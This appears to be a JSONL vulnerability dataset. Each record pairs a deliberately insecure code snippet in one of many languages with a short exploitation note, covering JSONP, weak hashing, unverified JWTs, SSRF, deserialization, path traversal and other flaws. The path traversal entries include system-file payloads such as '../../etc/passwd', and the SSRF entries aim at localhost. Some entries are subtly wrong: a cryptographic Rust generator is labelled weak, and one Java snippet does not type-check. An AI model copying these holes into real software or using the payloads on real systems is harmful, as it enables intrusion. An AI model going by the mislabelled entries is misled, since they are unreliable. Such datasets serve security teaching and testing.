{"id": "vuln-377", "language": "Kotlin", "vulnerability_type": "Insecure JSONP", "code_snippet": "val callback = call.request.queryParameters[\"callback\"]; call.respondText(\"$callback($data)\")", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-378", "language": "Scala", "vulnerability_type": "Insecure JSONP", "code_snippet": "val callback = params(\"callback\"); Ok(s\"$callback($data)\")", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-379", "language": "Rust", "vulnerability_type": "Insecure JSONP", "code_snippet": "let callback = req.query(\"callback\")?; res.render_text(format!(\"{}({})\", callback, data))", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-380", "language": "Elixir", "vulnerability_type": "Insecure JSONP", "code_snippet": "callback = params[\"callback\"]; send_resp(conn, 200, \"#{callback}(#{data})\")", "exploitation_techniques": "Inject malicious callback to steal data.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-381", "language": "Perl", "vulnerability_type": "Insecure JSONP", "code_snippet": "my $callback = $r->param('callback'); print \"$callback($data);\";", "exploitation_techniques": "Inject malicious callback function.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-382", "language": "Node.js", "vulnerability_type": "Weak Password Hashing", "code_snippet": "const hash = crypto.createHash('md5').update(password).digest('hex');", "exploitation_techniques": "Crack hashes with rainbow tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-383", "language": "Python", "vulnerability_type": "Weak Password Hashing", "code_snippet": "hash = hashlib.md5(password.encode()).hexdigest()", "exploitation_techniques": "Use rainbow tables to reverse hashes.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-384", "language": "Java", "vulnerability_type": "Weak Password Hashing", "code_snippet": "MessageDigest md = MessageDigest.getInstance(\"SHA1\"); String hash = md.digest(password.getBytes());", "exploitation_techniques": "Crack with precomputed tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-385", "language": "PHP", "vulnerability_type": "Weak Password Hashing", "code_snippet": "$hash = md5($password);", "exploitation_techniques": "Reverse hashes with rainbow tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-386", "language": "Ruby", "vulnerability_type": "Weak Password Hashing", "code_snippet": "hash = Digest::SHA1.hexdigest(password)", "exploitation_techniques": "Crack with precomputed tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-387", "language": "Go", "vulnerability_type": "Weak Password Hashing", "code_snippet": "hash := sha1.Sum([]byte(password))", "exploitation_techniques": "Use rainbow tables to crack hashes.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-388", "language": "C# (.NET)", "vulnerability_type": "Weak Password Hashing", "code_snippet": "var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));", "exploitation_techniques": "Crack with rainbow tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-389", "language": "Kotlin", "vulnerability_type": "Weak Password Hashing", "code_snippet": "val hash = MessageDigest.getInstance(\"SHA1\").digest(password.toByteArray())", "exploitation_techniques": "Reverse hashes with tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-390", "language": "Scala", "vulnerability_type": "Weak Password Hashing", "code_snippet": "val hash = MessageDigest.getInstance(\"MD5\").digest(password.getBytes)", "exploitation_techniques": "Crack with precomputed tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-391", "language": "Rust", "vulnerability_type": "Weak Password Hashing", "code_snippet": "let hash = sha1::Sha1::from(password).digest().bytes();", "exploitation_techniques": "Use rainbow tables to crack.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-392", "language": "Elixir", "vulnerability_type": "Weak Password Hashing", "code_snippet": "hash = :crypto.hash(:md5, password)", "exploitation_techniques": "Crack with rainbow tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-393", "language": "Perl", "vulnerability_type": "Weak Password Hashing", "code_snippet": "use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);", "exploitation_techniques": "Reverse with rainbow tables.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-394", "language": "Node.js", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "app.use(session({ secret: 'secret', cookie: { maxAge: null } }));", "exploitation_techniques": "Steal session cookies for persistent access.", "cwe_category": "Session & Token Management"}
{"id": "vuln-395", "language": "Python", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "app.config['SESSION_COOKIE_LIFETIME'] = None", "exploitation_techniques": "Reuse stolen cookies indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-396", "language": "Java", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "session.setMaxInactiveInterval(0);", "exploitation_techniques": "Persistent session hijacking.", "cwe_category": "Session & Token Management"}
{"id": "vuln-397", "language": "PHP", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "session_set_cookie_params(0);", "exploitation_techniques": "Steal cookies for indefinite access.", "cwe_category": "Session & Token Management"}
{"id": "vuln-398", "language": "Ruby", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "config.session_store :cookie_store, expire_after: nil", "exploitation_techniques": "Persistent session cookie attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-399", "language": "Go", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: id, Expires: time.Time{}})", "exploitation_techniques": "Reuse cookies indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-400", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "services.AddSession(options => { options.IdleTimeout = TimeSpan.Zero; });", "exploitation_techniques": "Persistent session hijacking.", "cwe_category": "Session & Token Management"}
{"id": "vuln-401", "language": "Kotlin", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "sessionConfig { cookie.maxAgeInSeconds = 0 }", "exploitation_techniques": "Steal session cookies for persistent access.", "cwe_category": "Session & Token Management"}
{"id": "vuln-402", "language": "Scala", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "sessionConfig.withMaxAge(None)", "exploitation_techniques": "Reuse stolen cookies indefinitely.", "cwe_category": "Session & Token Management"}
{"id": "vuln-403", "language": "Rust", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "cookie.set_expires(None);", "exploitation_techniques": "Persistent session hijacking.", "cwe_category": "Session & Token Management"}
{"id": "vuln-404", "language": "Elixir", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "plug :fetch_session; put_session(conn, :user_id, id)", "exploitation_techniques": "Steal cookies for indefinite access.", "cwe_category": "Session & Token Management"}
{"id": "vuln-405", "language": "Perl", "vulnerability_type": "Insecure Session Timeout", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$id\");", "exploitation_techniques": "Persistent session attacks.", "cwe_category": "Session & Token Management"}
{"id": "vuln-406", "language": "Node.js", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "const payload = jwt.decode(token);", "exploitation_techniques": "Forge tokens without signature verification.", "cwe_category": "Session & Token Management"}
{"id": "vuln-407", "language": "Python", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "payload = jwt.decode(token, options={'verify_signature': False})", "exploitation_techniques": "Craft malicious JWTs to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-408", "language": "Java", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "JWT jwt = JWTParser.parse(token);", "exploitation_techniques": "Inject forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-409", "language": "PHP", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "$payload = JWT::decode($token, null, false);", "exploitation_techniques": "Forge tokens to impersonate users.", "cwe_category": "Session & Token Management"}
{"id": "vuln-410", "language": "Ruby", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "payload = JWT.decode(token, nil, false)", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-411", "language": "Go", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "token, _ := jwt.Parse(tokenString, nil)", "exploitation_techniques": "Forge tokens to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-412", "language": "C# (.NET)", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "var payload = JwtSecurityTokenHandler().ReadJwtToken(token);", "exploitation_techniques": "Inject forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-413", "language": "Kotlin", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "val jwt = JWT.decode(token)", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-414", "language": "Scala", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "val payload = JWT.decode(token)", "exploitation_techniques": "Forge tokens to impersonate users.", "cwe_category": "Session & Token Management"}
{"id": "vuln-415", "language": "Rust", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "let claims = jsonwebtoken::decode_header(&token)?;", "exploitation_techniques": "Inject forged JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-416", "language": "Elixir", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "{:ok, payload, _} = Joken.peek(token)", "exploitation_techniques": "Craft malicious JWTs.", "cwe_category": "Session & Token Management"}
{"id": "vuln-417", "language": "Perl", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "my $payload = decode_jwt($token, undef, 0);", "exploitation_techniques": "Forge tokens to bypass auth.", "cwe_category": "Session & Token Management"}
{"id": "vuln-418", "language": "Node.js", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "const token = Math.random().toString(36).substring(2);", "exploitation_techniques": "Predict random values for token guessing.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-419", "language": "Python", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "import random; token = ''.join(random.choices('abcdef0123456789', k=16))", "exploitation_techniques": "Predict tokens due to weak PRNG.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-420", "language": "Java", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "Random rand = new Random(); String token = String.valueOf(rand.nextLong());", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-421", "language": "PHP", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "$token = substr(str_shuffle('abcdef0123456789'), 0, 16);", "exploitation_techniques": "Predict tokens due to weak randomness.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-422", "language": "Ruby", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join", "exploitation_techniques": "Predict random tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-423", "language": "Go", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "rand.Seed(time.Now().UnixNano()); token := rand.Int63()", "exploitation_techniques": "Predict values based on seed.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-424", "language": "C# (.NET)", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "var rand = new Random(); var token = rand.Next().ToString();", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-425", "language": "Kotlin", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "val token = Random().nextLong().toString()", "exploitation_techniques": "Predict tokens due to weak PRNG.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-426", "language": "Scala", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "val token = scala.util.Random.nextString(16)", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-427", "language": "Rust", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "let token = thread_rng().gen::<u64>().to_string();", "exploitation_techniques": "Predict values from weak PRNG.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-428", "language": "Elixir", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "token = :rand.uniform(1_000_000_000) |> Integer.to_string()", "exploitation_techniques": "Predict random tokens.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-429", "language": "Perl", "vulnerability_type": "Weak Random Number Generation", "code_snippet": "my $token = join '', map { ('a'..'z')[rand 26] } 1..16;", "exploitation_techniques": "Predict random values.", "cwe_category": "Cryptography & Secrets"}
{"id": "vuln-430", "language": "Node.js", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "res.cookie('session', token);", "exploitation_techniques": "Steal cookies via XSS or MITM.", "cwe_category": "Session & Token Management"}
{"id": "vuln-431", "language": "Python", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "response.set_cookie('session', token)", "exploitation_techniques": "Access cookies via XSS or insecure HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-432", "language": "Java", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "Cookie cookie = new Cookie(\"session\", token); response.addCookie(cookie);", "exploitation_techniques": "Steal cookies via XSS or MITM.", "cwe_category": "Session & Token Management"}
{"id": "vuln-433", "language": "PHP", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "setcookie('session', $token);", "exploitation_techniques": "Steal cookies via XSS or HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-434", "language": "Ruby", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "cookies[:session] = token", "exploitation_techniques": "Access cookies via XSS or MITM.", "cwe_category": "Session & Token Management"}
{"id": "vuln-435", "language": "Go", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"session\", Value: token})", "exploitation_techniques": "Steal cookies via XSS or HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-436", "language": "C# (.NET)", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "Response.Cookies.Append(\"session\", token);", "exploitation_techniques": "Steal via XSS or insecure HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-437", "language": "Kotlin", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "call.response.cookies.append(\"session\", token)", "exploitation_techniques": "Access cookies via XSS or MITM.", "cwe_category": "Session & Token Management"}
{"id": "vuln-438", "language": "Scala", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "Ok.withCookies(Cookie(\"session\", token))", "exploitation_techniques": "Steal cookies via XSS or HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-439", "language": "Rust", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "res.cookie(Cookie::new(\"session\", token))", "exploitation_techniques": "Access cookies via XSS or MITM.", "cwe_category": "Session & Token Management"}
{"id": "vuln-440", "language": "Elixir", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "put_resp_cookie(conn, \"session\", token)", "exploitation_techniques": "Steal cookies via XSS or HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-441", "language": "Perl", "vulnerability_type": "Insecure Cookie Flags", "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token\");", "exploitation_techniques": "Steal via XSS or insecure HTTP.", "cwe_category": "Session & Token Management"}
{"id": "vuln-443", "language": "Python", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "response = requests.get(request.args.get('url'))", "exploitation_techniques": "Request internal endpoints like http://127.0.0.1.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-444", "language": "Java", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "URL url = new URL(request.getParameter(\"url\")); url.openConnection().getInputStream();", "exploitation_techniques": "Access internal APIs or localhost.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-445", "language": "PHP", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "file_get_contents($_GET['url']);", "exploitation_techniques": "Request internal resources: http://localhost.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-446", "language": "Ruby", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "response = Net::HTTP.get(URI(params[:url]))", "exploitation_techniques": "Access internal endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-447", "language": "Go", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"))", "exploitation_techniques": "Request internal services like http://127.0.0.1.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-448", "language": "C# (.NET)", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "var response = await new HttpClient().GetAsync(Request.Query[\"url\"]);", "exploitation_techniques": "Access internal APIs.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-449", "language": "Kotlin", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "val response = URL(call.request.queryParameters[\"url\"]).readText()", "exploitation_techniques": "Request internal endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-450", "language": "Scala", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "val response = scala.io.Source.fromURL(params(\"url\")).mkString", "exploitation_techniques": "Access internal services.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-451", "language": "Rust", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "let resp = reqwest::get(&req.query(\"url\")?).await?;", "exploitation_techniques": "Request internal resources.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-452", "language": "Elixir", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "{:ok, _} = HTTPoison.get(params[\"url\"])", "exploitation_techniques": "Access internal endpoints.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-453", "language": "Perl", "vulnerability_type": "Server-Side Request Forgery", "code_snippet": "my $response = LWP::UserAgent->new->get($r->param('url'));", "exploitation_techniques": "Request internal services.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-454", "language": "Node.js", "vulnerability_type": "Insecure Deserialization", "code_snippet": "const serialize = require('node-serialize'); serialize.unserialize(userInput);", "exploitation_techniques": "Inject malicious serialized objects for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-455", "language": "Python", "vulnerability_type": "Insecure Deserialization", "code_snippet": "import pickle; obj = pickle.loads(request.data)", "exploitation_techniques": "Craft pickle payload for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-456", "language": "Java", "vulnerability_type": "Insecure Deserialization", "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();", "exploitation_techniques": "Inject gadget chains for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-457", "language": "PHP", "vulnerability_type": "Insecure Deserialization", "code_snippet": "$obj = unserialize($_POST['data']);", "exploitation_techniques": "Inject malicious serialized objects.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-458", "language": "Ruby", "vulnerability_type": "Insecure Deserialization", "code_snippet": "obj = Marshal.load(user_input)", "exploitation_techniques": "Craft malicious payload for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-459", "language": "Go", "vulnerability_type": "Insecure Deserialization", "code_snippet": "decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);", "exploitation_techniques": "Inject malicious gob data.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-460", "language": "C# (.NET)", "vulnerability_type": "Insecure Deserialization", "code_snippet": "BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);", "exploitation_techniques": "Inject malicious serialized objects.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-461", "language": "Kotlin", "vulnerability_type": "Insecure Deserialization", "code_snippet": "val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject()", "exploitation_techniques": "Craft malicious objects for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-462", "language": "Scala", "vulnerability_type": "Insecure Deserialization", "code_snippet": "val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject()", "exploitation_techniques": "Inject gadget chains for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-463", "language": "Rust", "vulnerability_type": "Insecure Deserialization", "code_snippet": "let obj: T = serde_json::from_str(&user_input)?;", "exploitation_techniques": "Inject malicious JSON to manipulate structs.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-464", "language": "Elixir", "vulnerability_type": "Insecure Deserialization", "code_snippet": "obj = :erlang.binary_to_term(user_input)", "exploitation_techniques": "Craft malicious terms for RCE.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-465", "language": "Perl", "vulnerability_type": "Insecure Deserialization", "code_snippet": "use Storable qw(thaw); my $obj = thaw($user_input);", "exploitation_techniques": "Inject malicious serialized data.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-466", "language": "Node.js", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));", "exploitation_techniques": "Query schema to map API and craft attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-467", "language": "Python", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))", "exploitation_techniques": "Extract schema to plan attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-468", "language": "Java", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } }", "exploitation_techniques": "Query schema to discover endpoints.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-469", "language": "PHP", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);", "exploitation_techniques": "Map schema to craft targeted queries.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-470", "language": "Ruby", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "class MySchema < GraphQL::Schema; query Types::Query; end", "exploitation_techniques": "Query schema to extract API details.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-471", "language": "Go", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})", "exploitation_techniques": "Extract schema to plan attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-472", "language": "C# (.NET)", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "services.AddGraphQL().AddSchema<MySchema>();", "exploitation_techniques": "Query schema to map API.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-473", "language": "Kotlin", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "graphql { schema { query = Query::class } }", "exploitation_techniques": "Extract schema for attack planning.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-474", "language": "Scala", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "SchemaDefinition(queries = List(Field(\"query\", ...)))", "exploitation_techniques": "Query schema to discover endpoints.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-475", "language": "Rust", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();", "exploitation_techniques": "Map schema to craft attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-476", "language": "Elixir", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "schema do query do ... end end", "exploitation_techniques": "Query schema to extract API details.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-477", "language": "Perl", "vulnerability_type": "Insecure GraphQL Introspection", "code_snippet": "my $schema = GraphQL::Schema->new(query => $query);", "exploitation_techniques": "Extract schema to plan attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-478", "language": "Node.js", "vulnerability_type": "Path Traversal", "code_snippet": "fs.readFileSync(path.join('public', req.query.file))", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-479", "language": "Python", "vulnerability_type": "Path Traversal", "code_snippet": "with open(os.path.join('public', request.args.get('file'))) as f: return f.read()", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-480", "language": "Java", "vulnerability_type": "Path Traversal", "code_snippet": "Files.readString(Paths.get(\"public\", request.getParameter(\"file\")));", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-481", "language": "PHP", "vulnerability_type": "Path Traversal", "code_snippet": "readfile('public/' . $_GET['file']);", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-482", "language": "Ruby", "vulnerability_type": "Path Traversal", "code_snippet": "File.read(File.join('public', params[:file]))", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-483", "language": "Go", "vulnerability_type": "Path Traversal", "code_snippet": "data, _ := os.ReadFile(filepath.Join(\"public\", r.URL.Query().Get(\"file\")))", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-484", "language": "C# (.NET)", "vulnerability_type": "Path Traversal", "code_snippet": "File.ReadAllText(Path.Combine(\"public\", Request.Query[\"file\"]))", "exploitation_techniques": "Access: ../../web.config", "cwe_category": "Access & Authorization"}
{"id": "vuln-485", "language": "Kotlin", "vulnerability_type": "Path Traversal", "code_snippet": "File(\"public/${call.request.queryParameters[\"file\"]}\").readText()", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-486", "language": "Scala", "vulnerability_type": "Path Traversal", "code_snippet": "scala.io.Source.fromFile(s\"public/${params(\"file\")}\").mkString", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-487", "language": "Rust", "vulnerability_type": "Path Traversal", "code_snippet": "fs::read_to_string(Path::new(\"public\").join(req.query(\"file\")?))?", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-488", "language": "Elixir", "vulnerability_type": "Path Traversal", "code_snippet": "File.read!(\"public/\" <> params[\"file\"])", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-489", "language": "Perl", "vulnerability_type": "Path Traversal", "code_snippet": "open(my $fh, '<', \"public/$filename\");", "exploitation_techniques": "Access: ../../etc/passwd", "cwe_category": "Access & Authorization"}
{"id": "vuln-490", "language": "Node.js", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "app.post('/login', (req, res) => authenticate(req.body));", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-491", "language": "Python", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "@app.route('/login', methods=['POST']) def login(): authenticate(request.form)", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-492", "language": "Java", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "@PostMapping(\"/login\") public Response login(@RequestBody Credentials creds) { ... }", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-493", "language": "PHP", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); }", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-494", "language": "Ruby", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "post '/login' do authenticate(params) end", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-495", "language": "Go", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "http.HandleFunc(\"/login\", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-496", "language": "C# (.NET)", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "[HttpPost(\"login\")] public IActionResult Login([FromBody] Credentials creds) { ... }", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-497", "language": "Kotlin", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "post(\"/login\") { authenticate(call.request.receive()) }", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-498", "language": "Scala", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "post(\"/login\") { authenticate(params.as[Credentials]) }", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-499", "language": "Rust", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "router.post(\"/login\", |req| authenticate(req.body()?))", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-500", "language": "Elixir", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "post \"/login\", AuthController, :login", "exploitation_techniques": "Brute force login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-501", "language": "Perl", "vulnerability_type": "Insecure Rate Limiting", "code_snippet": "if ($r->uri eq '/login') { authenticate($r->param('user')); }", "exploitation_techniques": "Brute force credentials via rapid requests.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-502", "language": "Node.js", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "res.cookie('csrf_token', token); app.post('/action', verifyCsrf);", "exploitation_techniques": "Forge CSRF tokens via cookie manipulation.", "cwe_category": "Session & Token Management"}
{"id": "vuln-503", "language": "Python", "vulnerability_type": "Insecure CSRF Token Storage", "code_snippet": "response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])", "exploitation_techniques": "Manipulate CSRF cookie to bypass protection.", "cwe_category": "Session & Token Management"}
